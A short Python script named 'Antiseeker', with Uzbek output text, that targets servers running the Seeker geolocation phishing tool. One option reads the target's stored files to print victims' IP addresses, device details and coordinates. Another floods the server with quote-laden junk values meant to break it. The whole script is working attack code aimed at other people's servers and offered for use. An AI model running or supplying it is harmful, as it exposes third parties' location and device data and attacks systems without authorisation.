# Antiseeker v 1.0
# Author: Uzbekmind
# Don`t change(Noob!!!)
# Telegram channel: @Uzbekmind_public <--
# If you use a part from my code, read License

R = '\033[31m' #Qizil
G = '\033[32m' #Yashil

import requests, json, sys, colorama
import threading
import time
def check(name):
    greq = requests.get(url+"/php/result.txt")
    try:
        jgres = json.loads(greq.text)
        print("Kenglik  : "+jgres['info'][0]['lat'])
        print("Uzunlik : "+jgres['info'][0]['lon'])
        sys.exit
    except:
        jres=1

print(R + '''
                 ╔═╗┌┐┌┌┬┐┬╔═╗┌─┐┌─┐┬┌─┌─┐┬─┐
                 ╠═╣│││ │ │╚═╗├┤ ├┤ ├┴┐├┤ ├┬┘
                 ╩ ╩┘└┘ ┴ ┴╚═╝└─┘└─┘┴ ┴└─┘┴└─ ''')
print( G + ''' 
Author: Uzbekmind | Telegram channel: @uzbekmind_public
---------------------------------------------------------''')                 
help = """
-h    Qo`llanma

-p    Seeker haqida ma`lumot olish -p [havola]
     \033[33m -p https://*****.ngrok.io \033[0m

-c    Seekerga hujum qilish -c [havola]
     \033[33m -c https://*****.ngrok.io \033[0m

-l    Seeker manzilini aniqlash -l [vaqt] [havola]
     \033[33m -l 10 https://*****.ngrok.io \033[0m
"""
if sys.argv[1] == "-p":
    url = sys.argv[2]
    res = requests.get(url+"/php/info.txt")
    try:
        jres = json.loads(res.text)
    except:
        print(res.text)
        jres=1
    if jres == "":
        print("Ma`lumot topilmadi!")
    elif jres == 1:
        pass
    else:
        print("Oper.Tizim : "+jres['dev'][0]['os'])
        print("Qurilma    : "+jres['dev'][0]['platform'])
        print("Brauzer    : "+jres['dev'][0]['browser'])
        print("Yadrolar   : "+jres['dev'][0]['cores'])
        print("RAM xotira : "+jres['dev'][0]['ram'])
        print("IP manzil  : "+jres['dev'][0]['ip'])
        print("Yetkazuvchi: "+jres['dev'][0]['vendor'])
        print("Sotuvchi   : "+jres['dev'][0]['render'])
elif sys.argv[1] == "-c":
    url = sys.argv[2]
    Lat = 'qw%27erty000"'
    Lon = "qwert'y000 %22"
    Acc = "qwe/#rty;00:0"
    Alt = "qwerty][]]000"
    Dir = "qwer':ty000"
    Spq = 'qwert":y000'
    requests.post(url+"/php/result.php", data={"Lat":Lat, "Lon":Lon, "Acc":Acc, "Alt":Alt, "Dir":Dir, "Spq":Spq}, headers={"Content-Type": "text/html", "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"})
    print("Seeker sindirildi!")
elif sys.argv[1] == "-l":
    se = sys.argv[2]
    url = sys.argv[3]
    for i in range(int(se)):
        x = threading.Thread(target=check, args=(i,))
        x.start()
        time.sleep(0.5)
    x.join()
else:
    print(help)
